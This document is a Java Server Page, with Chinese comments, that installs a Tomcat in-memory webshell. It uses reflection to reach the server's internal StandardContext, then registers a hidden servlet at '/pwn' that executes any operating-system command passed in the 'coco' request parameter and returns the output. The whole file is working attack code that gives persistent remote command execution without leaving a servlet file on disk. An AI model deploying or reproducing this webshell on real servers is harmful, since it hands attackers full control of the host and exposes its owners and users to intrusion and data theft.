<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.ServletDef" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
try {
    //获取ApplicationContextFade对象，ApplicationContextFade是ServletContext的实现，所以其实是ServletContext对象
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = null;
    try {
        appctx = servletContext.getClass().getDeclaredField("context"); //从ApplicationContextFade获取context，这里context是指ApplicationContext
    } catch (NoSuchFieldException e) {
        e.printStackTrace();
    }
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); //获取ApplicationContext

    Field standCtx = applicationContext.getClass().getDeclaredField("context");
    standCtx.setAccessible(true);
    StandardContext standardContext = (StandardContext) standCtx.get(applicationContext);

    Servlet servlet =  new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("coco") !=null) {
                InputStream in = Runtime.getRuntime().exec(req.getParameter("coco")).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                return;
            }
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    };


    ServletDef servletDef = new ServletDef();
    servletDef.setServletClass(servlet.getClass().getName());
    servletDef.setServletName("ServletShell");

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName(servletDef.getServletName());
    wrapper.setServlet(servlet);
    wrapper.setServletClass(servletDef.getServletClass());
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/pwn", "ServletShell");
    out.print("Add Servlet Memory Shell Success!");
}
    catch (Exception e) {
        e.printStackTrace();
    }
%>